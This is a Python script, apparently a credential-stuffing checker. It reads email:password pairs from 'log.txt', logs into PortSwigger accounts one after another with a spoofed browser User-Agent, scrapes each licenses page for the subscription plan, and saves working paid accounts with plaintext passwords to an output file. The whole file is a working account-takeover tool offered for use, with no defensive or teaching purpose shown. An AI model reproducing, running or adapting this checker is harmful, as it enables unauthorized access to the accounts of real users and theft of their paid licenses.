#!/usr/bin/env python3
"""
PortSwigger Plan Extractor - Extract subscription plans from log.txt
Validate credentials and extract plan information (Professional, Enterprise, Community)
Output only paid accounts with plan info
"""

import requests
import re
import sys
from datetime import datetime
from urllib.parse import urlencode

INPUT_FILE = "log.txt"
OUTPUT_FILE = "portswigger_paid_accounts.txt"
FAILED_FILE = "portswigger_account_failures.txt"

LOGIN_URL = "https://portswigger.net/users"
LOGIN_POST_URL = "https://login.portswigger.net/u/login"
LICENSES_URL = "https://portswigger.net/users/youraccount/licenses"

class PortSwiggerChecker:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })
        self.session.timeout = 30

    def extract_state(self, html):
        """Extract state parameter from login form"""
        match = re.search(r'name="state" value="([^"]+)"', html)
        return match.group(1) if match else None

    def extract_all_form_fields(self, html):
        """Extract all form fields from login form"""
        fields = {}
        pattern = r'<input[^>]+name="([^"]+)"[^>]+value="([^"]*)"'
        for match in re.finditer(pattern, html):
            fields[match.group(1)] = match.group(2)
        return fields

    def extract_plan(self, html):
        """Extract subscription plan from licenses page"""
        if "You do not have any subscriptions" in html:
            return None  # Free account

        # Look for plan type in HTML
        if "Professional" in html:
            return "Professional"
        elif "Enterprise" in html:
            return "Enterprise"
        elif "Community" in html:
            return "Community"

        # If there's a license but plan type not found, assume paid
        if "license" in html.lower() or "subscription" in html.lower():
            return "Unknown"

        return None

    def check_login_and_plan(self, email, password):
        """Check if credentials are valid and extract plan"""
        try:
            # Get login page to extract all form fields
            resp1 = self.session.get(LOGIN_URL, timeout=30)
            if resp1.status_code != 200:
                return None, f"login_page_error: {resp1.status_code}"

            # Extract all form fields
            form_fields = self.extract_all_form_fields(resp1.text)
            if not form_fields:
                return None, "no_form_fields"

            # Update with our credentials
            form_fields['username'] = email
            form_fields['password'] = password

            # POST credentials with all form fields
            resp2 = self.session.post(LOGIN_POST_URL, data=form_fields, timeout=30, allow_redirects=True)

            # Check response status
            if resp2.status_code == 400:
                # Extract error message if available
                error_match = re.search(r'error["\']?\s*[:=]\s*["\']?([^"\'<]+)', resp2.text, re.IGNORECASE)
                error_msg = error_match.group(1) if error_match else "http_400"
                return None, f"post_error: {error_msg}"

            # Check if login failed
            if "Wrong email or password" in resp2.text or "Invalid email or password" in resp2.text:
                return None, "invalid_creds"

            # Check if still on login page
            if "name=\"state\"" in resp2.text and LOGIN_POST_URL in resp2.url:
                return None, "login_failed"

            # Try to access licenses page to confirm auth
            resp3 = self.session.get(LICENSES_URL, timeout=30)
            if resp3.status_code == 200:
                plan = self.extract_plan(resp3.text)
                return plan, "checked"
            else:
                return None, f"access_denied: {resp3.status_code}"

        except requests.exceptions.Timeout:
            return None, "timeout"
        except requests.exceptions.ConnectionError:
            return None, "connection_error"
        except Exception as e:
            return None, f"error: {str(e)}"

def read_credentials(filename):
    """Read credentials from file"""
    creds = []
    try:
        with open(filename, 'r') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    if ':' in line:
                        creds.append(line)
        return creds
    except FileNotFoundError:
        print(f"ERROR: File not found: {filename}")
        sys.exit(1)

def main():
    print("[*] PortSwigger Plan Extractor")
    print(f"[*] Input: {INPUT_FILE}")
    print(f"[*] Paid accounts: {OUTPUT_FILE}")
    print(f"[*] Failures: {FAILED_FILE}")
    print("")

    # Read credentials
    print("Step 1: Reading credentials...")
    creds = read_credentials(INPUT_FILE)
    print(f"✓ Loaded {len(creds)} credentials")
    print("")

    # Initialize checker
    checker = PortSwiggerChecker()

    # Check credentials and extract plans
    print("Step 2: Checking logins and extracting plans...")
    paid_accounts = []
    failed_accounts = []

    for idx, cred in enumerate(creds, 1):
        email, password = cred.split(':', 1)
        sys.stdout.write(f"\r[{idx}/{len(creds)}] Processing... Paid: {len(paid_accounts)}")
        sys.stdout.flush()

        plan, reason = checker.check_login_and_plan(email, password)

        if plan:  # Only paid accounts
            paid_accounts.append((email, password, plan, reason))
        else:
            failed_accounts.append((email, password, reason))

    print(f"\r[{len(creds)}/{len(creds)}] Processing... Paid: {len(paid_accounts)}    ")
    print("")

    # Write results
    print("Step 3: Writing results...")

    # Write paid accounts
    with open(OUTPUT_FILE, 'w') as f:
        f.write(f"# Paid PortSwigger Accounts (email|password|plan)\n")
        f.write(f"# Generated: {datetime.now().isoformat()}\n")
        f.write(f"# Total: {len(paid_accounts)}\n")
        f.write(f"#\n")
        for email, password, plan, reason in paid_accounts:
            f.write(f"{email}|{password}|{plan}\n")

    # Write failed accounts
    with open(FAILED_FILE, 'w') as f:
        f.write(f"# Failed or Free Accounts\n")
        f.write(f"# Generated: {datetime.now().isoformat()}\n")
        f.write(f"# Total: {len(failed_accounts)}\n")
        f.write(f"#\n")
        for email, password, reason in failed_accounts:
            f.write(f"{email}:{password} # {reason}\n")

    print(f"✓ Paid: {OUTPUT_FILE}")
    print(f"✓ Failed/Free: {FAILED_FILE}")
    print("")

    # Summary
    print("============================================================")
    print("PLAN EXTRACTION COMPLETE")
    print("============================================================")
    print(f"Total checked: {len(creds)}")
    print(f"Paid accounts: {len(paid_accounts)}")
    print(f"Failed/Free: {len(failed_accounts)}")
    if len(creds) > 0:
        print(f"Success rate: {len(paid_accounts)*100/len(creds):.1f}%")
    print("============================================================")

if __name__ == "__main__":
    main()
